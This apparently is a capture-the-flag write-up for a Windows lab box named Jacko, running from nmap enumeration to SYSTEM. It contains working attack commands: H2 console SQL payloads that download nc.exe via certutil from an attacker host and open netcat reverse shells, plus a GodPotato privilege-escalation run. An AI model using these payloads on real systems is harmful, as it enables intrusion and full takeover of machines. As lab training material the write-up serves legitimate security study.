---
machine: Jacko
platform: Proving Grounds
category: Windows
difficulty: Medium
tags: [h2-database, rce, seimpersonate, godpotato]
date: 2026-07-17
status: retired
summary: A Windows box exposing an embedded Java database console — testing a known script-engine remote-code-execution technique against the database's web console for an initial foothold, then a SeImpersonatePrivilege abuse tool to finish as SYSTEM.
---

## Enumeration

nmap scan:

```bash
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8082/tcp  open  blackice-alerts
9092/tcp  open  XmlIpcRegSvc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 54.89 seconds

# Nmap 7.99 scan initiated Fri Jul 17 14:18:48 2026 as: /usr/lib/nmap/nmap -p 80,135,139,445,5040,8082, -sCV -T4 -oN fingerprint target 9092
Nmap scan report for target (192.168.246.66)
Host is up (0.033s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-17T18:21:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for 9092 (0.0.35.132)
Host is up (0.00072s latency).

PORT     STATE  SERVICE         VERSION
80/tcp   closed http
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5040/tcp closed unknown
8082/tcp closed blackice-alerts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 17 14:21:49 2026 -- 2 IP addresses (2 hosts up) scanned in 181.11 seconds
```

## Foothold

We can paste the write and load native library into 192.168.246.66:8082 run it, and then gain RCE via the Evaluate Script SQL section:
https://www.exploit-db.com/exploits/49384

We get RCE as `jacko\tony`

We can transfer over a windows revshell (generated with msfvenom) with:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.211:9999/nc.exe C:\\Users\\tony\\Downloads\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```

And then we can execute it to callback to our listener

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Downloads\\nc.exe -e cmd 192.168.45.211 4444").getInputStream()).useDelimiter("\\Z").next()');
```

We can catch it:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/pg/jacko]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.246.66] 50196
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>whoami
```

We can retrieve the flag from tony's desktop.

We are unable to execute certain commands like `whoami` in the shell, but we can mitigate this by performing them in the webgui:

```powershell
C:\Users>whoami /priv
whoami /priv
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

We can only run whoami when in its home directory `C:\Windows\System32`

```powershell
C:\Windows\System32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

## Privilege Escalation

We see we have SeImpersonatePrivilege so we will attempt to use GodPotato

We can download it with the certutil binary in `C:\Windows\System32`

```powershell
C:\Windows\System32>certutil -urlcache -split -f http://192.168.45.211:9999/godpotato4.exe C:\Users\tony\downloads\godpotato.exe
certutil -urlcache -split -f http://192.168.45.211:9999/godpotato4.exe C:\Users\tony\downloads\godpotato.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

We can use godpotato to execute `nc -e cmd <ip> <listener_port>` for a system revshell:

```powershell
C:\Users\tony\Downloads>godpotato.exe -cmd "nc.exe -e cmd 192.168.45.211 9000"
godpotato.exe -cmd "nc.exe -e cmd 192.168.45.211 9000"
[*] CombaseModule: 0x140735462309888
[*] DispatchTable: 0x140735464652384
[*] UseProtseqFunction: 0x140735464019984
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\339a1c96-96df-403c-a1a7-2e351caafb64\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001002-0778-ffff-547a-5e302b65b655
[*] DCOM obj OXID: 0xc20931804d738f2
[*] DCOM obj OID: 0x86bb6b83c1d0e5ff
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 800 Token:0x476  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1848


C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of C:\Users\Administrator\Desktop

05/03/2022  06:32 PM    <DIR>          .
05/03/2022  06:32 PM    <DIR>          ..
04/27/2020  09:11 PM             1,450 Microsoft Edge.lnk
07/17/2026  09:25 PM                34 proof.txt
               2 File(s)          1,484 bytes
               2 Dir(s)   7,207,202,816 bytes free
```

Here we can retrieve the proof.txt and the box is complete.
